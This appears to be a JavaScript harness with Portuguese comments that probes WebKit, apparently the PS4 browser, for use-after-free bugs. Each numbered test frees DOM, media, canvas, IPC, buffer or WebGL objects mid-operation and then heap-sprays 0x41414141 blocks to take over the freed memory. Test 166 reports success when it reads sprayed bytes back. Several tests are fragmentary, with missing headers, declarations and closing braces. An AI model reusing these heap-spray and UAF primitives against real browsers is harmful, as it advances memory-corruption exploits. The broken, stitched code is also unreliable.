        function logOutput(msg) {
            const out = document.getElementById('output');
            out.innerText = msg + '\n' + out.innerText;

            document.getElementById('output').innerText = '--- A iniciar novo teste ---\n';
            document.getElementById('test-containers').innerHTML = '';

        // Função utilitária para tentar reescrever a memória recém-libertada (Heap Spray)
        function heapSpray() {
            let spray = [];
            for (let i = 0; i < 5000; i++) {
                // Aloca blocos de memória com o padrão 0x41414141 (AAAA)
                let arr = new Uint32Array(256);
                arr.fill(0x41414141);
                spray.push(arr);
            }
            return spray;
        }

        // ==========================================
        // Teste 151: ContainerNode.cpp (DOMNodeInserted + Spray)
        // ==========================================
        function runTest151() {
            clearOutput();
            try {
                const container = document.getElementById('test-containers');
                let pai = document.createElement('div');
                let refChild = document.createElement('span');
                let novoFilho = document.createElement('p');
                
                pai.appendChild(refChild);
                container.appendChild(pai);

                // O evento legado é SÍNCRONO. Pausa a função C++ ContainerNode::insertBefore a meio.
                pai.addEventListener('DOMNodeInserted', function handler(e) {
                    try {
                        // 1. Destruímos o nó de referência
                        refChild.remove();
                        refChild = null;

                        // 2. Pulverizamos a memória para tentar ocupar o lugar do nó C++ original
                        window.lixoPulverizado = heapSpray();
                        
                        // 3. O C++ vai tentar continuar a inserção quando esta função terminar
                        pai.removeEventListener('DOMNodeInserted', handler);
                        logOutput("[Teste 151] Evento síncrono intercetado. refChild destruído e Heap pulverizado.");
                    } catch(err) {}
                });

                // Aciona o ContainerNode::insertBefore no C++
                pai.insertBefore(novoFilho, refChild);

            } catch(e) {
                logOutput("[Teste 151] Motor C++ estabilizou o ponteiro bruto antes de retomar: " + e);
            }
        }

        // ==========================================
        // Teste 152: HTMLMediaElement.cpp (Play Promise UAF)
        // ==========================================
        function runTest152() {
            clearOutput();
            try {
                const container = document.getElementById('test-containers');
                let video = document.createElement('video');
                // Adiciona um source vazio para engatilhar a lógica de rede C++
                video.src = "blob:null"; 
                container.appendChild(video);

                // Chama play(), que retorna uma Promise ligada ao objeto C++
                let playPromise = video.play();

                if (playPromise !== undefined) {
                    playPromise.then(() => {
                        logOutput("[Teste 152] Promise resolvida ignorando a destruição.");
                    }).catch(error => {
                        logOutput("[Teste 152] C++ rejeitou a Promise de forma segura: " + error);
                    });

                    // Microtask: Aniquila o vídeo antes da Promise C++ ter a chance de notificar o JS
                    queueMicrotask(() => {
                        video.remove();
                        video = null;
                        window.sprayMedia = heapSpray();
                        logOutput("[Teste 152] HTMLMediaElement aniquilado enquanto a Promise nativa estava pendente.");
                    });
                } else {
                    logOutput("[Teste 152] play() não retornou Promise (comportamento de WebKit antigo confirmado).");
                }
            } catch(e) {
                logOutput("[Teste 152] Falha na gestão assíncrona da media: " + e);
            }
        }

        // ==========================================
        // Teste 154: Node.cpp (Event Dispatch Table Collapse)
        // ==========================================
        function runTest154() {
            clearOutput();
            try {
                const container = document.getElementById('test-containers');
                let avo = document.createElement('div');
                let pai = document.createElement('div');
                let filho = document.createElement('button');
                
                pai.appendChild(filho);
                avo.appendChild(pai);
                container.appendChild(avo);

                // Intercetamos na fase de CAPTURA (descida, antes de chegar ao alvo)
                avo.addEventListener('click', function(e) {
                    try {
                        // O C++ calculou a rota (avo -> pai -> filho)
                        // Destruímos os nós subsequentes da memória antes que o C++ lá chegue

                        // Pulverizamos para corromper a tabela de despacho de eventos C++

                        logOutput("[Teste 154] Árvore destruída na fase de captura. Despacho C++ a caminho de um nó fantasma.");
                    } catch(err) {}
                }, true); // true = Use Capture

                // Disparamos o evento
                filho.dispatchEvent(new MouseEvent('click', { bubbles: true }));

            } catch(e) {
                logOutput("[Teste 154] Motor WebKit recalcula a tabela de eventos dinamicamente com segurança: " + e);
            }
        }

        // ==========================================
        // Teste 155: Memory Allocator Pressure (GC Forcer)
        // ==========================================
        function runTest155() {
            clearOutput();
            try {
                const container = document.getElementById('test-containers');
                let alvo = document.createElement('audio');
                container.appendChild(alvo);

                alvo.onsuspend = function() {
                    try {
                        alvo.remove();
                        // Neste momento, o ponteiro de media no C++ está orfão.
                        // Em vez de um GC brando, forçamos o limite de RAM do processo aba (abaixo do limite de OOM kill do PS4)
                        let matrizGigante = [];
                        try {
                            // Alocação bloqueante massiva para esmagar a memória livre
                            for(let i = 0; i < 50000; i++) {
                                matrizGigante.push(new ArrayBuffer(1024 * 64)); // blocos de 64KB
                            }
                        } catch(oom) {
                            // Se bater no limite de RAM, o GC vai rodar obrigatoriamente
                            logOutput("[Teste 155] Limite de RAM atingido propositadamente para forçar GC.");
                        }
                        
                        logOutput("[Teste 155] OOM simulado concluído a meio da suspensão de hardware.");
                    } catch(err) {}
                };

                alvo.dispatchEvent(new Event('suspend'));

            } catch(e) {
                logOutput("[Teste 155] Sobrecarga de memória lidada sem falha de segmentação: " + e);
            }
        }
// ==========================================
        // Teste 156: Real Iframe Teardown UAF
        // ==========================================

            clearOutput();
            try {

                    <body>
                        <script>

                                    // Acessa o frame pai e destrói o contentor do próprio iframe
                                    let meuContentor = window.parent.document.getElementById('test-containers');
                                    meuContentor.innerHTML = '';
                                    
                                    // Pulveriza a memória na thread principal enquanto o C++ ainda está no unload
                                    window.parent.sprayIframe = window.parent.heapSpray();
                                } catch(e) {}
                            };
                        <\/script>
                    </body>
                `);
                doc.close();

                // Força a navegação REAL. O C++ inicia o processo assíncrono de teardown.
                setTimeout(() => {
                    iframe.src = "about:blank";
                    logOutput("[Teste 156] Navegação real engatilhada. unload nativo intercetado e memória pulverizada.");
                }, 100);

            } catch(e) {

        // ==========================================
        // Teste 157: Genuine Media Blob Parsing UAF
        // ==========================================
        function runTest157() {
            clearOutput();
            try {
                const container = document.getElementById('test-containers');
                let video = document.createElement('video');
                container.appendChild(video);

                // Criamos um MP4 falso mínimo e válido para o parser C++ tentar ler
                let dummyMP4 = new Uint8Array([
                    0x00, 0x00, 0x00, 0x18, 0x66, 0x74, 0x79, 0x70, // ftyp
                    0x69, 0x73, 0x6F, 0x6D, 0x00, 0x00, 0x02, 0x00,
                    0x69, 0x73, 0x6F, 0x6D, 0x69, 0x73, 0x6F, 0x32
                ]);
                let blob = new Blob([dummyMP4], { type: 'video/mp4' });
                let url = URL.createObjectURL(blob);

                // Quando o C++ abrir a thread de I/O e confirmar os metadados...
                video.onloadedmetadata = function() {
                    try {
                        // O motor está com os ponteiros ativamente abertos.
                        // Revogamos o acesso, destruímos o nó e enchemos o Heap de lixo.
                        URL.revokeObjectURL(url);
                        video.remove();
                        video = null;
                        
                        window.sprayMedia = heapSpray();
                        logOutput("[Teste 157] Parser MP4 genuíno atacado. Ponteiro destruído e memória sobreescrita.");
                    } catch(err) {}
                };

                // Inicia o carregamento nativo real
                video.src = url;

            } catch(e) {
                logOutput("[Teste 157] Motor WebCore protegeu a thread de parsing de media: " + e);
            }
        }

        // ==========================================
        // Teste 158: Native TreeWalker Filter Panic
        // ==========================================
        function runTest158() {
            clearOutput();
            try {
                const container = document.getElementById('test-containers');
                let raiz = document.createElement('div');
                let filho = document.createElement('span');
                raiz.appendChild(filho);
                container.appendChild(raiz);

                // O C++ chama esta função nativamente a cada passo da travessia
                let filtroNatividade = {
                    acceptNode: function(node) {
                        if (node.tagName === 'SPAN') {
                            // A meio da travessia C++, nós aniquilamos a árvore inteira
                            raiz.remove();
                            // Pulverizamos para tentar corromper o ponteiro interno 'currentNode' do WebKit
                            window.sprayWalker = heapSpray();
                            return NodeFilter.FILTER_ACCEPT;
                        }
                        return NodeFilter.FILTER_SKIP;
                    }
                };

                let walker = document.createTreeWalker(raiz, NodeFilter.SHOW_ELEMENT, filtroNatividade, false);

                // Esta chamada desce para o C++, que então invoca o nosso filtro de volta
                walker.nextNode();
                
                logOutput("[Teste 158] Filtro TreeWalker C++ corrompido com sucesso durante a iteração.");

            } catch(e) {
                logOutput("[Teste 158] TreeWalker seguro contra mutações destrutivas a meio da travessia: " + e);
            }
        }

                logOutput("[Teste 159] Gestor de submissão do WebCore geriu a desanexação perfeitamente: " + e);
            }
        }

        // Teste 160: requestAnimationFrame Render Collapse
        // ==========================================
        function runTest160() {
            clearOutput();
            try {
                const container = document.getElementById('test-containers');
                
                let style = document.createElement('style');
                document.head.appendChild(style);
                let sheet = style.sheet;
                sheet.insertRule("#renderAlvo { width: 100px; height: 100px; background: red; }", 0);

                let div = document.createElement('div');
                div.id = "renderAlvo";
                container.appendChild(div);

                // Associa a rotina ao ciclo de pintura real do GPU/Renderer do WebKit
                requestAnimationFrame(() => {
                    try {
                        // O C++ vai pintar a tela no próximo microsegundo.
                        // Apagamos a regra estrutural no último instante possível.
                        sheet.deleteRule(0);
                        
                        // Pulverizamos imediatamente para sujar o motor de layout
                        window.sprayRender = heapSpray();
                        
                        logOutput("[Teste 160] deleteRule executado precisamente no frame de pintura C++.");
                        
                        // Limpeza
                        setTimeout(() => { if(style.parentNode) style.remove(); }, 100);
                    } catch(err) {}
                });

            } catch(e) {
                logOutput("[Teste 160] Pipeline de renderização à prova de corrupção síncrona de CSSOM: " + e);
            }
        }

        // ==========================================
        // Teste 163: Canvas putImageData VRAM Crash

        function runTest163() {

                // Cria um buffer de 4MB de pixéis
                let imgData = ctx.createImageData(1000, 1000);

                let armadilha = {
                    valueOf: function() {
                        // O C++ preparou a cópia de memória em bloco (memcpy nativo).
                        // Pausou para ler a coordenada Y. Destruímos a superfície de destino definindo a dimensão a zero.
                        canvas.width = 0;
                        canvas.height = 0;
                        
                        // Pulverizamos para sujar os ponteiros do canvas

                    ctx.putImageData(imgData, 0, armadilha);
                    logOutput("[Teste 163] putImageData lidou com a destruição síncrona da superfície com segurança.");

        // ==========================================
        // Teste 165: MessageChannel IPC Queue Collapse
        // ==========================================
        function runTest165() {
            clearOutput();
            try {
                // Cria um canal de comunicação de memória partilhada genuíno
                let channel = new MessageChannel();
                
                // Um payload suficientemente grande para obrigar o IPC a fragmentar ou demorar milissegundos
                let payload = new Uint8Array(2 * 1024 * 1024); // 2MB
                
                channel.port2.onmessage = function(e) {
                    logOutput("[Teste 165] Mensagem sobreviveu e chegou à porta 2.");
                };

                // Inicia o envio
                channel.port1.postMessage(payload);

                // O C++ está a transferir os dados na fila IPC nativa.
                // Fechamos violentamente a porta de destino e apagamos as referências.
                channel.port2.close();
                channel.port1.close();
                channel = null;
                
                // Pulverizamos o heap para tentar corromper as portas no C++
                window.sprayIPC = heapSpray();
                
                logOutput("[Teste 165] Carga IPC massiva enviada e portas fechadas a meio do trânsito. A aguardar estabilização.");

            } catch(e) {
                logOutput("[Teste 165] Motor WebCore protegeu a fila IPC de mensagens órfãs: " + e);
            }
        }
// ==========================================
        // Teste 166: structuredClone Buffer Detachment
        // ==========================================
        function runTest166() {
            clearOutput();
            try {
                // Aloca 1MB na memória
                let buffer = new ArrayBuffer(1024 * 1024);
                let view = new Uint8Array(buffer);
                view[0] = 0xAA;

                // Transfere a propriedade absoluta da memória para o abismo nativo
                // O WebKit tem de desanexar (detach) o buffer original
                try {
                    structuredClone(buffer, { transfer: [buffer] });
                } catch(e) {
                    logOutput("[Teste 166] structuredClone falhou ou não suporta a flag de transferência nesta build.");
                    return;
                }

                // Pulveriza imediatamente a memória livre
                window.sprayTransfer = heapSpray();

                // Tenta aceder à vista do buffer desanexado.
                // Se a engine não tiver invalidado os ponteiros internos da vista, temos acesso a memória morta.
                try {
                    let leituraFantasma = view[0];
                    if (leituraFantasma === 0x41) { // 0x41 = 'A' (resultado do spray)
                        logOutput("[Teste 166] SUCESSO UAF! Lemos os bytes pulverizados do buffer desanexado.");
                    } else {
                        logOutput("[Teste 166] C++ validou o desanexo. Leitura abortada ou protegida de forma segura.");
                    }
                } catch(ignora) {}

            } catch(e) {
                logOutput("[Teste 166] Falha de proteção do motor JavaScriptCore: " + e);
            }
        }

                // Cria um invólucro para poder ser aniquilado com outerHTML

                    logOutput("[Teste 175] Extensão WEBGL_lose_context não habilitada no motor.");

                let bufferGL = gl.createBuffer();
                gl.bindBuffer(gl.ARRAY_BUFFER, bufferGL);

                canvas.addEventListener('webglcontextlost', function(e) {
                    e.preventDefault();
                    try {
                        // O C++ assinalou o hardware como "perdido".
                        // Invocamos métodos destrutivos em objetos que deveriam estar intocáveis neste estado.
                        gl.deleteBuffer(bufferGL);
                        canvas.remove();

                        window.sprayGL = heapSpray();
                        logOutput("[Teste 175] Contexto WebGL destruído e memória pulverizada com sucesso.");
                    } catch(err) {}
                }, false);

                // Dispara o sinalizador no C++
                ext.loseContext();

            } catch(e) {
                logOutput("[Teste 175] Motor gráfico colapsou durante o desmantelamento de estado do WebGL: " + e);
